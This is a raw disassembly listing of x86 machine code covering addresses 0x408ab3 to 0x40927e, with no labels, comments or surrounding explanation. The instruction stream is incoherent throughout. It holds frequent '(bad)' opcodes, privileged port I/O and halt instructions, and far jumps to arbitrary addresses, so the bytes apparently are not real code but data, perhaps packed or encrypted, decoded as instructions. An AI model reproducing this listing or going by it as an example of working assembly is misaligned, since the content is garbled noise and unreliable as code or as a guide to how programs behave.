  408ab3:	pusha  
  408ab4:	rol    BYTE PTR [edx-0x28],0xc3
  408ab8:	xor    eax,0xfdf8dbd9
  408abd:	sub    al,cl
  408abf:	ins    BYTE PTR es:[edi],dx
  408ac0:	xchg   esp,eax
  408ac1:	mov    ecx,DWORD PTR [ecx+0x2843ea74]
  408ac7:	sbb    esi,DWORD PTR [esi]
  408ac9:	sbb    ch,dh
  408acb:	ss cmp dh,ch
  408ace:	mov    edi,0xf5f90573
  408ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad4:	mov    dl,BYTE PTR [esi+edi*4+0x59]
  408ad8:	arpl   WORD PTR [edx-0x20062775],si
  408ade:	jmp    0x37b69c6d
  408ae3:	adc    BYTE PTR [eax+0x29f29e3b],cl
  408ae9:	sub    DWORD PTR [esp+eax*8],esp
  408aec:	pop    edi
  408aed:	xor    DWORD PTR [ebp+0x4b7ab415],ebx
  408af3:	fisttp DWORD PTR [esi]
  408af5:	cwde   
  408af6:	fisub  DWORD PTR [esi]
  408af8:	add    eax,0x11e26133
  408afd:	push   0x46
  408aff:	imul   edx,DWORD PTR [edi-0xe66a859],0x3a
  408b06:	xchg   esp,eax
  408b07:	jno    0x408a9a
  408b09:	(bad)  
  408b0a:	push   ecx
  408b0b:	push   ebx
  408b0c:	sub    DWORD PTR [eax-0x54],edx
  408b0f:	out    dx,eax
  408b10:	or     DWORD PTR [edx],esp
  408b12:	retf   
  408b13:	call   0xd5089ef8
  408b18:	mov    ebp,ebx
  408b1a:	mov    ebx,esp
  408b1c:	ficomp DWORD PTR [ebx]
  408b1e:	fstp   QWORD PTR [edi]
  408b20:	in     al,dx
  408b21:	dec    ebp
  408b22:	inc    esi
  408b23:	stos   DWORD PTR es:[edi],eax
  408b24:	in     al,dx
  408b25:	scas   al,BYTE PTR es:[edi]
  408b26:	push   ecx
  408b27:	dec    ebp
  408b28:	pop    ss
  408b29:	mov    edi,0x199e5b17
  408b2e:	cmp    BYTE PTR [ebp-0x210c08cc],0xed
  408b35:	mul    DWORD PTR [esp+ebp*2+0x47]
  408b39:	repnz fstp TBYTE PTR [ebp+0x5f74e0f6]
  408b40:	inc    ebp
  408b41:	(bad)  [edi]
  408b43:	pop    ss
  408b44:	aad    0x55
  408b46:	jo     0x408b2a
  408b48:	imul   ebp,DWORD PTR [esi],0x5c61835e
  408b4e:	lds    ecx,FWORD PTR [ebx]
  408b50:	leave  
  408b51:	pusha  
  408b52:	and    edx,DWORD PTR [edx+0x9]
  408b55:	jle    0x408bb8
  408b57:	cmc    
  408b58:	or     eax,0x4e4d0cf2
  408b5d:	out    dx,al
  408b5e:	pop    esp
  408b5f:	out    0x57,eax
  408b61:	jmp    0x408bcb
  408b63:	in     al,0xd4
  408b65:	iret   
  408b66:	sbb    ch,BYTE PTR [ecx+0x7215b0ab]
  408b6c:	out    dx,eax
  408b6d:	or     dl,ch
  408b6f:	pop    esi
  408b70:	mov    eax,0x91a3043b
  408b75:	jecxz  0x408b49
  408b77:	bound  edi,QWORD PTR [ebp+0x1096755c]
  408b7d:	addr16 mov cl,0xc7
  408b80:	push   cs
  408b81:	jecxz  0x408be8
  408b83:	push   0xef25604
  408b88:	test   BYTE PTR [edi],al
  408b8a:	inc    esi
  408b8b:	pop    esi
  408b8c:	jle    0x408b4e
  408b8e:	icebp  
  408b8f:	rcr    DWORD PTR [ebx],0x98
  408b92:	jne    0x408b77
  408b94:	mov    dl,0x29
  408b96:	rcl    BYTE PTR fs:[ebx],cl
  408b99:	jle    0x408ba1
  408b9b:	repnz pop esi
  408b9d:	xor    DWORD PTR [eax+0x56],edx
  408ba0:	adc    BYTE PTR [ebp+ecx*4-0x12],bl
  408ba4:	or     eax,0xb2a446dc
  408ba9:	push   eax
  408baa:	or     edi,ebp
  408bac:	jb     0x408be2
  408bae:	in     eax,dx
  408baf:	pop    ss
  408bb0:	ds (bad) 
  408bb3:	fbld   TBYTE PTR [edi+0x14]
  408bb6:	les    edx,FWORD PTR [esi]
  408bb8:	test   eax,0xa96f55e9
  408bbd:	sbb    esi,DWORD PTR ss:[ebp+0x6ad6c4a6]
  408bc4:	pop    es
  408bc5:	mov    ecx,?
  408bc7:	push   0x84278151
  408bcc:	inc    ecx
  408bcd:	mov    esp,ebp
  408bcf:	mov    DWORD PTR [edx-0x30b29be0],ebx
  408bd5:	jb     0x408b58
  408bd7:	loope  0x408c3c
  408bd9:	mov    ds:0x29334080,eax
  408bde:	push   0xffffffa8
  408be0:	mov    ch,0xd1
  408be2:	mov    dh,0x13
  408be4:	xchg   edi,eax
  408be5:	ret    
  408be6:	sub    eax,DWORD PTR [edi]
  408be8:	jno    0x408c5d
  408bea:	pop    edi
  408beb:	mov    ebp,0x7e6ed16
  408bf0:	xor    ebp,DWORD PTR [eax+0xd]
  408bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf4:	push   0xb6769073
  408bf9:	(bad)  
  408bfb:	std    
  408bfc:	jmp    0x7fc8:0x8165ab7f
  408c03:	xchg   BYTE PTR [ecx],dl
  408c05:	les    ecx,FWORD PTR [edx-0x69e876f7]
  408c0b:	push   edi
  408c0c:	sbb    eax,0xcb5cebaf
  408c11:	pop    ecx
  408c12:	xchg   BYTE PTR [ecx-0x5ab0817],cl
  408c18:	cwde   
  408c19:	cs mov dh,0x21
  408c1c:	mov    edx,0x31efbd2c
  408c21:	aas    
  408c22:	mov    ah,0x8e
  408c24:	jnp    0x408c65
  408c26:	and    al,0x70
  408c28:	add    ah,ah
  408c2a:	mov    cl,0x28
  408c2c:	xor    dl,cl
  408c2e:	sub    esp,0xfffffff3
  408c31:	adc    al,0x9d
  408c33:	add    DWORD PTR [ecx-0x33],ebx
  408c36:	pop    es
  408c37:	(bad)  
  408c38:	out    0xec,al
  408c3a:	les    ebp,FWORD PTR [ecx+0x59]
  408c3d:	xor    DWORD PTR ds:0x3f3c89b9,edi
  408c43:	and    eax,0xa361ad6c
  408c48:	xchg   edi,eax
  408c49:	xchg   esi,eax
  408c4a:	jle    0x408c1f
  408c4c:	xor    ch,BYTE PTR [edi+0x5e]
  408c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c50:	lods   al,BYTE PTR ds:[esi]
  408c51:	ja     0x408c3f
  408c53:	sub    ecx,DWORD PTR [ecx-0x25]
  408c56:	xchg   esp,eax
  408c57:	int3   
  408c58:	or     al,0x9d
  408c5a:	mov    ss:0x53961d2e,al
  408c60:	fwait
  408c61:	mov    al,ds:0x5b4369ac
  408c66:	retf   
  408c67:	inc    edx
  408c68:	xchg   edi,eax
  408c69:	mov    bl,0x6
  408c6b:	mov    WORD PTR [ebx+0x5d],es
  408c6e:	(bad)  
  408c6f:	sti    
  408c70:	jo     0x408c9a
  408c72:	cmp    ch,BYTE PTR [ebx+0x62cc5a20]
  408c78:	dec    ebp
  408c79:	adc    eax,0x6f9331ef
  408c7e:	add    dl,dl
  408c80:	push   0xffffffec
  408c82:	daa    
  408c83:	outs   dx,DWORD PTR ds:[esi]
  408c84:	push   0x11520b68
  408c89:	dec    esp
  408c8a:	lods   eax,DWORD PTR ds:[esi]
  408c8b:	das    
  408c8c:	xchg   ax,ax
  408c8e:	sbb    al,0x84
  408c90:	int3   
  408c91:	bound  esi,QWORD PTR [ebp-0x21]
  408c94:	push   edi
  408c95:	adc    BYTE PTR [edi+0x74],cl
  408c98:	popf   
  408c99:	lods   eax,DWORD PTR ds:[esi]
  408c9a:	repnz data16 aas 
  408c9d:	frstor [esp+esi*8+0x5d5aa744]
  408ca4:	rol    DWORD PTR [ebx+0x35],1
  408ca7:	fst    DWORD PTR [edx+eax*4-0xa]
  408cab:	cmp    al,0xa8
  408cad:	and    al,0x32
  408caf:	sbb    DWORD PTR [esi+0x632bae05],ecx
  408cb5:	xor    al,0x32
  408cb7:	je     0x408cf1
  408cb9:	adc    BYTE PTR [ecx+0x4],0xcb
  408cbd:	rcl    DWORD PTR [edi-0x296de0a1],cl
  408cc3:	add    DWORD PTR [eax+0x790dc4fa],ebx
  408cc9:	aam    0x50
  408ccb:	push   ss
  408ccc:	hlt    
  408ccd:	outs   dx,DWORD PTR ds:[esi]
  408cce:	sub    dl,BYTE PTR [edx+ecx*8-0x41458ddc]
  408cd5:	loope  0x408cbd
  408cd7:	repnz push ebx
  408cd9:	push   ecx
  408cda:	adc    bh,BYTE PTR [eax-0xa]
  408cdd:	jmp    0x408cc1
  408cdf:	call   0x9786bbf6
  408ce4:	addr16 aas 
  408ce6:	lea    edi,[edi+0x23]
  408ce9:	jecxz  0x408d3e
  408ceb:	ds xchg ebp,eax
  408ced:	fs jp  0x408cfe
  408cf0:	pusha  
  408cf1:	std    
  408cf2:	pop    edi
  408cf3:	push   ebp
  408cf4:	sbb    bh,BYTE PTR [ecx+0x61344dbe]
  408cfa:	or     ah,BYTE PTR [ebp+0x1986b7da]
  408d00:	jns    0x408d3a
  408d02:	shr    ebx,1
  408d04:	add    DWORD PTR [ecx+ebx*2+0x28bd5a93],eax
  408d0b:	sub    DWORD PTR [edx-0x74595143],eax
  408d11:	shl    DWORD PTR [ecx+ebp*4+0x5b],0x48
  408d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d17:	aaa    
  408d18:	in     al,0xfc
  408d1a:	add    BYTE PTR [ebp+0x5f8dc7a4],bl
  408d20:	pop    ds
  408d21:	fild   WORD PTR [ebp-0x2fd49ac2]
  408d27:	pop    eax
  408d28:	enter  0x7152,0x3e
  408d2c:	repnz in eax,dx
  408d2e:	pop    esi
  408d2f:	outs   dx,DWORD PTR ds:[esi]
  408d30:	call   0x25e3bf05
  408d35:	mov    ah,0x89
  408d37:	dec    esp
  408d38:	out    0x79,eax
  408d3a:	mov    ch,0x95
  408d3c:	add    al,0x8b
  408d3e:	fsub   DWORD PTR [ecx+0x65]
  408d41:	sbb    al,0x9b
  408d43:	mov    DWORD PTR [esi-0x46847edd],eax
  408d49:	adc    edx,DWORD PTR [ecx+ebp*1]
  408d4c:	xchg   esp,eax
  408d4d:	(bad)  
  408d4e:	dec    esi
  408d4f:	outs   dx,DWORD PTR ds:[esi]
  408d50:	push   0x58
  408d52:	jae    0x408d5f
  408d54:	retf   
  408d55:	xchg   esp,eax
  408d56:	xchg   BYTE PTR [ebx],bh
  408d58:	iret   
  408d59:	pushf  
  408d5a:	and    al,0x22
  408d5c:	or     al,0xa2
  408d5e:	test   DWORD PTR [edx-0x28],0xff255735
  408d65:	repz mov ebx,0xa56f253e
  408d6b:	pop    ecx
  408d6c:	test   al,0x9
  408d6e:	out    0x5a,eax
  408d70:	mov    ds:0xe1a76a02,eax
  408d75:	pop    esp
  408d76:	fild   QWORD PTR [eax]
  408d78:	sub    edx,ebp
  408d7a:	adc    edi,DWORD PTR [eax]
  408d7c:	lods   al,BYTE PTR ds:[esi]
  408d7d:	sub    al,0x5f
  408d7f:	adc    al,0xfa
  408d81:	mov    ebx,0x8082df14
  408d86:	mov    ecx,ebx
  408d88:	ja     0x408d53
  408d8a:	push   ebx
  408d8b:	xchg   edi,eax
  408d8c:	pop    es
  408d8d:	pop    ss
  408d8e:	cmp    al,0x3f
  408d90:	bound  eax,QWORD PTR [ebx-0x3e9647a]
  408d96:	sahf   
  408d97:	mov    ?,WORD PTR [edx-0x53]
  408d9a:	imul   edx,DWORD PTR [ecx+0x66e5e549],0xc0008a46
  408da4:	ins    BYTE PTR es:[edi],dx
  408da5:	cmp    esi,edi
  408da7:	pop    edx
  408da8:	cli    
  408da9:	nop
  408daa:	push   ds
  408dab:	xchg   ecx,eax
  408dac:	(bad)  
  408dad:	xor    esi,DWORD PTR [ebp-0x32]
  408db0:	mov    DWORD PTR [ecx],eax
  408db2:	int    0xde
  408db4:	jo     0x408e09
  408db6:	cmc    
  408db7:	inc    ecx
  408db8:	test   BYTE PTR [ecx+edx*8-0x6b5f4ef1],bl
  408dbf:	sbb    eax,0xf8f58a62
  408dc4:	jmp    0x65d2:0xa759bb3e
  408dcb:	cmp    esi,ebp
  408dcd:	lock imul eax,DWORD PTR cs:[eax+0x21],0x12485449
  408dd6:	mov    cl,0xfd
  408dd8:	test   DWORD PTR [esi+eiz*1-0x2a3af26f],0xbfb304f0
  408de3:	or     ch,BYTE PTR [ecx+0x2e981d55]
  408de9:	adc    BYTE PTR [ebp-0x4a],dl
  408dec:	fistp  QWORD PTR ds:0xc2661182
  408df2:	out    dx,eax
  408df3:	out    0xae,eax
  408df5:	popa   
  408df6:	fnstsw WORD PTR [eax]
  408df8:	daa    
  408df9:	add    BYTE PTR [edx+0x32f0b285],dl
  408dff:	clc    
  408e00:	fimul  DWORD PTR [ecx]
  408e02:	scas   eax,DWORD PTR es:[edi]
  408e03:	js     0x408df1
  408e05:	mov    DWORD PTR [edi+0x77],ecx
  408e08:	dec    esi
  408e09:	jne    0x408dbf
  408e0b:	adc    ecx,DWORD PTR [ecx+0x7]
  408e0e:	loop   0x408e4a
  408e10:	jmp    0x40dc:0x509baae4
  408e17:	jnp    0x408e31
  408e19:	xchg   esi,eax
  408e1a:	pop    esp
  408e1b:	inc    ebp
  408e1c:	mov    esp,0x390f85af
  408e21:	fs leave 
  408e23:	leave  
  408e24:	add    cl,bl
  408e26:	or     ebx,DWORD PTR [ecx-0x32441223]
  408e2c:	dec    ebp
  408e2d:	cmp    ch,al
  408e2f:	shl    BYTE PTR [edx],0x9e
  408e32:	sub    al,0x6f
  408e34:	sbb    al,0x86
  408e36:	mov    ds:0x587625a0,al
  408e3b:	adc    eax,0x72390a0f
  408e40:	ja     0x408e5f
  408e42:	addr16 call 0x5c1:0xda821f82
  408e4a:	sbb    DWORD PTR [ebx+ebx*2-0x1f],eax
  408e4e:	sbb    eax,0xed1921d4
  408e53:	push   esi
  408e54:	pushf  
  408e55:	xchg   ebp,eax
  408e56:	pop    ds
  408e57:	sbb    BYTE PTR [ebx],ah
  408e59:	in     eax,0xab
  408e5b:	std    
  408e5c:	inc    esp
  408e5d:	out    dx,eax
  408e5e:	pop    ebx
  408e5f:	jns    0x408e35
  408e61:	cli    
  408e62:	mov    ebx,0x4b826122
  408e67:	in     al,0x83
  408e69:	cmp    dl,BYTE PTR [eax]
  408e6b:	and    ebp,DWORD PTR [edx-0x4a]
  408e6e:	push   esp
  408e6f:	and    al,0x24
  408e71:	and    BYTE PTR [esi+eax*8-0x298a8930],dh
  408e78:	mov    ds:0x17aab1fb,eax
  408e7d:	and    al,0xf5
  408e7f:	fcomp  QWORD PTR [eax-0x6ee992a7]
  408e85:	mov    edi,0xd058d88f
  408e8a:	shl    DWORD PTR [esi+eax*8-0x55b2ab6d],1
  408e91:	mov    ebp,0xdd631717
  408e96:	jns    0x408e24
  408e98:	sbb    eax,DWORD PTR [ecx]
  408e9a:	push   cs
  408e9b:	inc    ebp
  408e9c:	ret    
  408e9d:	xor    al,0x1d
  408e9f:	and    BYTE PTR [edx+eiz*2],bh
  408ea2:	push   0x65
  408ea4:	popa   
  408ea5:	stos   BYTE PTR es:[edi],al
  408ea6:	cmp    DWORD PTR [edx],edx
  408ea8:	lea    ebx,ds:0x342b26
  408eae:	(bad)  
  408eaf:	imul   edi,DWORD PTR [esi+0x487a1ccb],0x9977f424
  408eb9:	lahf   
  408eba:	scas   al,BYTE PTR es:[edi]
  408ebb:	rcr    DWORD PTR [ebp+0x7b2c6dcc],cl
  408ec1:	inc    eax
  408ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ec3:	dec    edx
  408ec4:	and    ah,BYTE PTR [edx]
  408ec6:	xor    al,0x2e
  408ec8:	in     al,dx
  408ec9:	adc    DWORD PTR [esi-0x43],edx
  408ecc:	sbb    eax,0x7e5a2ab8
  408ed1:	sbb    BYTE PTR [eax],al
  408ed3:	and    bh,BYTE PTR [ecx-0x7077656d]
  408ed9:	and    DWORD PTR [esi-0xf],0x4495b67f
  408ee0:	fdiv   st,st(0)
  408ee2:	fidiv  WORD PTR [eax-0x7c]
  408ee5:	fiadd  DWORD PTR [edx-0x2c]
  408ee8:	hlt    
  408ee9:	arpl   WORD PTR [ecx-0x80],dx
  408eec:	xchg   ecx,eax
  408eed:	daa    
  408eee:	in     eax,0xd2
  408ef0:	ja     0x408eeb
  408ef2:	adc    ah,al
  408ef4:	sub    ebp,ecx
  408ef6:	sub    DWORD PTR ds:0xa024,0xadcd2bbe
  408eff:	sub    eax,0xa2e31a87
  408f04:	fiadd  DWORD PTR [ebx]
  408f06:	imul   ebp,DWORD PTR [ebp+0x31f5bd4d],0x9222c82e
  408f10:	nop
  408f11:	jb     0x408ebc
  408f13:	dec    esp
  408f14:	(bad)  
  408f15:	out    0x47,al
  408f17:	or     DWORD PTR [edx-0x1786d4c6],esp
  408f1d:	rsqrtps xmm3,XMMWORD PTR [ebx-0x6e]
  408f21:	nop
  408f22:	mov    BYTE PTR [esi],al
  408f24:	jl     0x408f76
  408f26:	lock loopne 0x408f36
  408f29:	and    al,0x3a
  408f2b:	xchg   edi,eax
  408f2c:	push   ebx
  408f2d:	addr16 xchg ebx,eax
  408f2f:	fsubr  st,st(6)
  408f31:	lea    edi,[eax]
  408f33:	enter  0xd5f3,0xc7
  408f37:	jnp    0x408f3f
  408f39:	adc    al,0xf5
  408f3b:	push   es
  408f3c:	rol    ecx,1
  408f3e:	lods   al,BYTE PTR ds:[esi]
  408f3f:	mov    al,ds:0xdabce92b
  408f44:	add    bh,al
  408f46:	pop    ecx
  408f47:	gs jo  0x408f10
  408f4a:	jbe    0x408efe
  408f4c:	adc    al,0xb8
  408f4e:	jecxz  0x408fa8
  408f50:	add    al,0xb
  408f52:	push   edi
  408f53:	jbe    0x408f3a
  408f55:	mov    ch,0x57
  408f57:	cli    
  408f58:	mov    ch,0xa
  408f5a:	jnp    0x408f2b
  408f5c:	aas    
  408f5d:	fwait
  408f5e:	(bad)  
  408f5f:	das    
  408f60:	mov    al,0xc
  408f62:	lds    ebx,FWORD PTR [ebx-0xc]
  408f65:	jecxz  0x408fb7
  408f67:	in     al,0x9c
  408f69:	in     al,0x24
  408f6b:	lahf   
  408f6c:	jle    0x408fe9
  408f6e:	pusha  
  408f6f:	scas   al,BYTE PTR es:[edi]
  408f70:	xchg   edi,eax
  408f71:	(bad)  
  408f72:	jg     0x408f3d
  408f74:	sub    DWORD PTR [ebx+eax*8],ebx
  408f77:	cmp    ah,BYTE PTR [ebp+0x3b5674e3]
  408f7d:	add    bl,dh
  408f7f:	(bad)  
  408f80:	xor    eax,0xcffcd627
  408f85:	lds    ebx,FWORD PTR [ecx]
  408f87:	daa    
  408f88:	inc    edi
  408f89:	(bad)  
  408f8a:	dec    ebx
  408f8b:	push   ds
  408f8c:	mov    DWORD PTR fs:[eax],ebp
  408f8f:	pop    eax
  408f90:	pand   mm4,QWORD PTR [ebx+0x16]
  408f94:	adc    DWORD PTR [edi+0x3a],ebx
  408f97:	push   cs
  408f98:	in     al,0xff
  408f9a:	mov    ebx,0xe931a303
  408f9f:	add    BYTE PTR [edx],0x6
  408fa2:	adc    eax,0x9a71cb9d
  408fa7:	cmp    BYTE PTR [ecx+0x73],bh
  408faa:	add    BYTE PTR [ebp+0x1c],dl
  408fad:	add    DWORD PTR ds:0xc744577a,ecx
  408fb3:	xor    eax,0xb2e737f7
  408fb8:	xchg   ebp,eax
  408fb9:	sar    DWORD PTR [eax+eiz*1-0x2a],cl
  408fbd:	mov    WORD PTR [eax],gs
  408fbf:	shr    DWORD PTR ds:0x93296bff,cl
  408fc5:	adc    DWORD PTR [esi+0x27],eax
  408fc8:	adc    ecx,ecx
  408fca:	cwde   
  408fcb:	lods   eax,DWORD PTR ds:[esi]
  408fcc:	ror    DWORD PTR [esi+0x21ed6d2f],0x4a
  408fd3:	cmp    BYTE PTR [ebp+0x637549a8],ah
  408fd9:	call   0x2e17:0xf628b919
  408fe0:	gs mov ebx,0x996a80c9
  408fe6:	inc    ebp
  408fe7:	(bad)  
  408fe8:	pushf  
  408fe9:	cwde   
  408fea:	and    al,0xea
  408fec:	mov    DWORD PTR [ecx+ebx*4-0x19cad36],ebx
  408ff3:	adc    eax,0x666cac90
  408ff8:	std    
  408ff9:	push   ds
  408ffa:	mov    WORD PTR [ebx-0x52],fs
  408ffd:	or     bl,BYTE PTR [esi+0x60cb30aa]
  409003:	mov    al,0xeb
  409005:	mov    ah,0xe7
  409007:	xor    cl,BYTE PTR [eax+0x3282abae]
  40900d:	jp     0x409067
  40900f:	in     eax,0xa4
  409011:	cmp    ah,al
  409013:	fistp  WORD PTR [edx-0x7c]
  409016:	sbb    ebp,DWORD PTR [ebx+0x2e]
  409019:	sub    esi,esp
  40901b:	test   al,0x69
  40901d:	mov    eax,0x5394f0b7
  409022:	add    esp,DWORD PTR es:[edi]
  409025:	cs mov cl,0x64
  409028:	adc    esp,DWORD PTR [edi]
  40902a:	add    ebx,ebx
  40902c:	xchg   esi,eax
  40902d:	push   es
  40902e:	cmp    esp,ebp
  409030:	ds cmp esi,edx
  409033:	aad    0x29
  409035:	(bad)  
  409037:	cmc    
  409038:	rcl    eax,1
  40903a:	scas   eax,DWORD PTR es:[edi]
  40903b:	dec    esp
  40903c:	outs   dx,BYTE PTR ds:[esi]
  40903d:	fild   QWORD PTR [edx-0x18083665]
  409043:	dec    BYTE PTR [esi-0x3fda0668]
  409049:	popa   
  40904a:	push   ebx
  40904b:	jne    0x409054
  40904d:	mov    ?,WORD PTR [edx+0x2e763c1e]
  409053:	or     DWORD PTR [ecx],ebx
  409055:	jb     0x409053
  409057:	jmp    0x7375f2d0
  40905c:	call   0x78fccf44
  409061:	sbb    al,0x68
  409063:	or     al,0x24
  409065:	rcr    DWORD PTR [ecx+ebp*1+0x5db7c2f5],1
  40906c:	out    0x7c,al
  40906e:	lods   al,BYTE PTR ds:[esi]
  40906f:	inc    ebp
  409070:	dec    ecx
  409071:	aas    
  409072:	mov    ch,BYTE PTR [edx-0x6b]
  409075:	into   
  409076:	mov    eax,ds:0x90fdc07f
  40907b:	bound  esi,QWORD PTR [ecx*8+0x4a6ed8b2]
  409082:	out    dx,eax
  409083:	dec    esp
  409084:	or     DWORD PTR [ebx+0x483f5292],edi
  40908a:	jnp    0x4090a6
  40908c:	in     al,dx
  40908d:	ja     0x4090c3
  40908f:	xchg   BYTE PTR es:[esi-0x64d2139b],bl
  409096:	adc    eax,0x2d2a6da9
  40909b:	pop    esi
  40909c:	push   0xffffffc3
  40909e:	jle    0x40902e
  4090a0:	mov    al,0x66
  4090a2:	(bad)  
  4090a3:	jmp    0xc38fb35
  4090a8:	in     eax,0x3f
  4090aa:	retf   0xd472
  4090ad:	xchg   ebp,eax
  4090ae:	lahf   
  4090af:	add    al,0xaf
  4090b1:	sbb    al,BYTE PTR [ebp-0x46]
  4090b4:	sbb    al,BYTE PTR [ebp+0x67]
  4090b7:	xchg   BYTE PTR [edx+0x54],al
  4090ba:	add    ch,BYTE PTR [esi]
  4090bc:	rcl    DWORD PTR [edx+eiz*2],1
  4090bf:	pop    edx
  4090c0:	dec    esp
  4090c1:	fwait
  4090c2:	popa   
  4090c3:	nop
  4090c4:	mov    WORD PTR [ecx-0x7beb5eb9],?
  4090ca:	fs das 
  4090cc:	lock push 0x2d
  4090cf:	jo     0x40908f
  4090d1:	outs   dx,DWORD PTR ds:[esi]
  4090d2:	imul   edi,DWORD PTR [ebp+0x6ae9685c],0x6c
  4090d9:	rcl    BYTE PTR [ebx+0x60],0x22
  4090dd:	loope  0x4090f3
  4090df:	iret   
  4090e0:	nop
  4090e1:	inc    ebp
  4090e2:	cmc    
  4090e3:	mov    ebp,ebp
  4090e5:	sub    eax,0xc032774
  4090ea:	xor    esi,0x6f31790b
  4090f0:	scas   al,BYTE PTR es:[edi]
  4090f1:	adc    edx,ecx
  4090f3:	mov    edx,0xfa96b97f
  4090f8:	gs push edi
  4090fa:	jge    0x409127
  4090fc:	loopne 0x4090cb
  4090fe:	les    eax,FWORD PTR [ebx]
  409100:	xchg   esp,edx
  409102:	aad    0x29
  409104:	into   
  409105:	adc    BYTE PTR [ebx+ebx*8+0x66ac103f],bh
  40910c:	sbb    al,dh
  40910e:	fidivr WORD PTR [eax+0x10]
  409111:	retf   
  409112:	data16 (bad) [edi-0x26]
  409116:	(bad)  [ecx-0x23]
  409119:	mov    ebp,0x9a1c39a6
  40911e:	(bad)  
  409120:	lds    esi,FWORD PTR [ebx-0x4cf93c3c]
  409126:	sub    dh,dl
  409128:	jmp    0x7601:0xc8e375a0
  40912f:	adc    al,BYTE PTR [edi-0x10]
  409132:	mov    ds:0x4385ed56,al
  409137:	cli    
  409138:	sub    DWORD PTR [eax+edx*8],ecx
  40913b:	cmp    DWORD PTR [bx+si+0x18],esi
  40913f:	repnz in eax,0xc4
  409142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409143:	(bad)  
  409145:	add    DWORD PTR es:[esi-0x2a],edx
  409149:	xchg   DWORD PTR [ebp-0x2c3e2dc7],edx
  40914f:	mov    ebp,edi
  409151:	xchg   ebx,eax
  409152:	shl    BYTE PTR [eax-0x5bf38299],cl
  409158:	mov    ds:0xbebc5113,eax
  40915d:	call   0x74b244ba
  409162:	rcl    BYTE PTR [edx-0x53],0x97
  409166:	fsubr  st(3),st
  409168:	std    
  409169:	ret    0xd07f
  40916c:	sub    esi,DWORD PTR [edi+0x0]
  40916f:	push   es
  409170:	cdq    
  409171:	push   esp
  409172:	push   0xccd4bd5a
  409177:	inc    eax
  409178:	dec    ebp
  409179:	pop    ecx
  40917a:	mov    cs,WORD PTR [edx]
  40917c:	and    BYTE PTR [esi-0x622f82f2],0x28
  409183:	jle    0x40916d
  409185:	in     eax,0xad
  409187:	enter  0x4151,0xf9
  40918b:	mov    es,WORD PTR [edx]
  40918d:	sbb    DWORD PTR [ecx+0x49],ebx
  409190:	add    al,0x19
  409192:	inc    edi
  409193:	add    DWORD PTR [ecx+ebp*8],0xaf3e2790
  40919a:	dec    edx
  40919b:	cmp    edx,ebp
  40919d:	pop    eax
  40919e:	dec    ebp
  40919f:	xor    eax,0x76b14041
  4091a4:	adc    dl,BYTE PTR [ecx+0x2a69a687]
  4091aa:	mov    dl,0x42
  4091ac:	or     DWORD PTR [esi+0x1d21b7b6],edi
  4091b2:	cld    
  4091b3:	xchg   edi,eax
  4091b4:	xchg   esi,eax
  4091b5:	mul    bl
  4091b7:	sbb    eax,0xfbe2c139
  4091bc:	or     DWORD PTR [edi-0x6d],ebx
  4091bf:	popf   
  4091c0:	jne    0x40915b
  4091c2:	imul   eax,DWORD PTR [esi-0x6],0x5dd27a90
  4091c9:	stos   BYTE PTR es:[edi],al
  4091ca:	mov    esp,0x589a22d5
  4091cf:	or     BYTE PTR [eax-0x124b2bf5],cl
  4091d5:	aam    0xe5
  4091d7:	xchg   esi,eax
  4091d8:	in     al,dx
  4091d9:	push   ecx
  4091da:	dec    edi
  4091db:	fbld   TBYTE PTR [ecx-0x26f61ba9]
  4091e1:	les    edx,FWORD PTR [ebx]
  4091e3:	mov    ecx,0x1f96e231
  4091e8:	mov    ebp,0x3b68fab8
  4091ed:	popa   
  4091ee:	mov    eax,0xe954adfe
  4091f3:	mov    ebx,DWORD PTR [eax+0x62]
  4091f6:	ror    DWORD PTR [ebx],cl
  4091f8:	cmp    bl,bh
  4091fa:	inc    ecx
  4091fb:	dec    esi
  4091fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091fe:	push   ecx
  4091ff:	dec    ecx
  409200:	xchg   ecx,eax
  409201:	sti    
  409202:	and    al,0xe2
  409204:	sub    DWORD PTR [esi-0x78],esi
  409207:	mov    edx,0xcf231617
  40920c:	jecxz  0x40928c
  40920e:	lahf   
  40920f:	hlt    
  409210:	xor    ah,BYTE PTR [ecx]
  409212:	pop    ecx
  409213:	add    al,0x20
  409215:	jmp    0x7e12:0x8b3aec18
  40921c:	fistp  QWORD PTR [esp+ebp*4]
  40921f:	in     eax,0xb3
  409221:	inc    esp
  409222:	push   0x34
  409224:	add    edi,edi
  409226:	lods   al,BYTE PTR ds:[esi]
  409227:	int3   
  409228:	icebp  
  409229:	es clc 
  40922b:	cmp    BYTE PTR [ecx],0x10
  40922e:	fisubr DWORD PTR [eax-0x5f]
  409231:	js     0x4091ca
  409233:	test   DWORD PTR [edx+0x2806aa36],esi
  409239:	sub    ebp,esi
  40923b:	or     al,al
  40923d:	push   ecx
  40923e:	into   
  40923f:	cdq    
  409240:	or     dh,BYTE PTR [edx-0x10]
  409243:	xchg   esi,eax
  409244:	pop    ebp
  409245:	fistp  DWORD PTR [ebp-0xd]
  409248:	jbe    0x4091d7
  40924a:	mov    WORD PTR [ebx],?
  40924c:	jae    0x4092c2
  40924e:	in     al,0xdf
  409250:	out    0x92,eax
  409252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409253:	cdq    
  409254:	jnp    0x409252
  409256:	inc    ebx
  409257:	pop    eax
  409258:	(bad)  
  409259:	xchg   edx,eax
  40925a:	(bad)  
  40925b:	loopne 0x409200
  40925d:	xchg   ebx,eax
  40925e:	mov    ds:0x2cc56d77,al
  409263:	ss (bad) 
  409265:	(bad)  
  409266:	stos   BYTE PTR es:[edi],al
  409267:	mov    DWORD PTR [ebp-0x5030bf7e],edx
  40926d:	clc    
  40926e:	ins    BYTE PTR es:[edi],dx
  40926f:	outs   dx,DWORD PTR ds:[esi]
  409270:	sub    ah,BYTE PTR [esi]
  409272:	shl    DWORD PTR [ebp+0x3c5fab9e],0xff
  409279:	cmp    al,BYTE PTR [ebp+eiz*2-0x4d]
  40927d:	scas   eax,DWORD PTR es:[edi]
  40927e:	lea    esp,[eax-0x1b]
